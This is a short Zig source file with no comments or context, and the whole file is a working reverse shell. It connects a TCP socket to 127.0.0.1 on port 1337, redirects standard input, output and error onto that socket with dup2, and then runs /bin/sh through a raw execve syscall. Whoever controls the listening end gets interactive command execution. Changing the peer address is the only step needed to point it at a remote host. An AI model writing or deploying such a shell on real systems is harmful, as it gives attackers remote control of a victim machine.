const std = @import("std");
const os = std.os;
const net = std.net;

const EXECUTABLE = "/bin/sh";
const PEER = (net.Address.parseIp4("127.0.0.1", 1337) catch unreachable).in;

pub fn main() noreturn {
    const sockfd = os.socket(os.AF.INET, os.SOCK.STREAM, os.IPPROTO.TCP) catch unreachable;
    os.connect(sockfd, @ptrCast(&PEER), PEER.getOsSockLen()) catch unreachable;
    for (0..3) |i| {
    _ = os.linux.dup2(sockfd, @intCast(i));
    }
    _ = os.linux.syscall3(.execve, @intFromPtr(EXECUTABLE), 0, 0);
    unreachable;
}
